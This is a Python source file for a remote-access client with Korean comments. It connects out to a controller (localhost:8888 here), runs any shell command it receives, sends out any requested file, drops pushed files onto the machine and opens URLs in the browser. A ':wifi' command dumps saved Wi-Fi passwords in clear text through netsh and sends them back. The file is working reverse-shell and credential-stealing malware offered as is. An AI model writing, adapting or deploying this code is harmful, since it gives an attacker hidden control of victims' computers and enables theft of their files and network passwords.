import socket
import os, sys
import subprocess
import webbrowser as browser
from sendrecv import SendRecv

class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(3600)
        self.controller = SendRecv(self.sock)
        self.codec = "utf-8"

        self.sock.connect((host, port))
        self.shell()

    def shell(self):
        """ 명령을 총괄하는 함수 """
        mainDir = os.getcwd()
        prevDirs = []

        while True:
            command = self.controller.recv()
            command = command.decode(self.codec).strip()
            if command:
                if ":download" in command:
                    self.upload(command)
                elif ":upload" in command:
                    self.download(command)
                elif command == ":kill":
                    self.sock.shutdown(2)
                    self.sock.close()
                    break
                elif command == ":codec":
                    self.codec = self.get_codec()
                elif ":browse" in command:
                    self.browse(command)
                elif command == ":wifi":
                    self.wifiPW()
                elif "cd" in command:
                    dirc = "".join(command.split("cd")).strip()
                    if not dirc.strip() : pass # controler.send("{}\n".format(os.getcwd()).encode(self.codec))
                    elif dirc == "-": 
                        if not prevDirs: self.controller.send("error: cd: 이전 경로가 없습니다! \n".encode(self.codec))
                        else:
                            tmpdir = prevDirs.pop()
                            os.chdir(tmpdir)
                            # controler.send(f"이전 디렉토리로 돌아갑니다 [ {tmpdir}/ ]\n")
                    elif dirc =="--":
                        prevDirs.append(os.getcwd())
                        os.chdir(mainDir)
                        # controler.send(f"메인 디렉토리로 돌아갑니다[ {mainDir}/ ]\n".encode(self.codec))
                    else:
                        if not os.path.isdir(dirc): self.controller.send(f"error: cd: '{dirc}': 해당 파일이나 폴더를 찾을수 없습니다!\n".encode(self.codec))
                        else:
                            prevDirs.append(os.getcwd())
                            os.chdir(dirc)
                    self.controller.send(str.encode(os.getcwd() + "> "))
                elif command == ":check":
                    self.controller.send(b":Done:")
                elif command == ":getcwd":
                    self.controller.send(os.getcwd().encode(self.codec))
                else:
                    output_str = self.runCMD(command)
                    self.controller.send(bytes(output_str))

        return


    def runCMD(self, command):
        """ 터미널으로 명렁 실행 """
        cmd = subprocess.Popen(command,
                               shell=True,
                               stdout=subprocess.PIPE,
                               stdin=subprocess.PIPE,
                               stderr=subprocess.PIPE)
        return cmd.stdout.read() + cmd.stderr.read()
    
    def wifiPW(self):
        """ 내장 명령어로 wifi 비밀번호를 알아낸다 """
        try:
            info = self.runCMD("netsh wlan show profile name=* key=clear")
        except Exception:
            info = b":Error:"
        finally:
            self.controller.send(info)

    def download(self, command):
        """ 보내진 파일을 다운로드 한다 """
        filetodown = "".join(command.split(":upload")).strip()
        filename = filetodown.split("/")[-1] if "/" in filetodown else filetodown.split("\\")[-1] if "\\" in filetodown else filetodown

        with open(filename, "wb") as wf:
            while True:
                data = self.controller.recv()
                if data == b":Done:": break
                elif data == b":Aborted:":
                    wf.close()
                    os.remove(filename)
                    return
                wf.write(data)
        self.controller.send(str(os.getcwd()+os.sep+filename).encode(self.codec))

    def upload(self, command):
        """ 요구하는 파일을 업로드 한다 """
        filetosend = "".join(command.split(":download")).strip()
        if not os.path.isfile(filetosend): self.controller.send(f"error: '{filetosend}': 해당 파일을 찾을수 없습니다 !".encode(self.codec))
        else:
            self.controller.send(b":True:")
            with open(filetosend, "rb") as rf:
                for data in iter(lambda: rf.read(4100), b""):
                    try: self.controller.send(data)
                    except (KeyboardInterrupt, EOFError):
                        rf.close()
                        self.controller.send(b":Aborted:")
                        return
            self.controller.send(b":Done:")

    def browse(self, command):
        """ 브라우저를 해당 url로 켠다 """
        url = "".join(command.split(":browse")).strip()
        browser.open(url)
        self.controller.send(b":Done:")



    def get_codec(self):
        """ 해당 터미널 환경의 코텍을 확인&전송 """
        try:
            output = self.runCMD("chcp")
            codec = output.split(b":")[-1].strip().decode("utf-8")
        except:
            codec = "utf-8"
        self.controller.send(str(codec).encode("utf-8"))
        return codec
        

try:
    c = Client("localhost", 8888)
except Exception:
    print("error")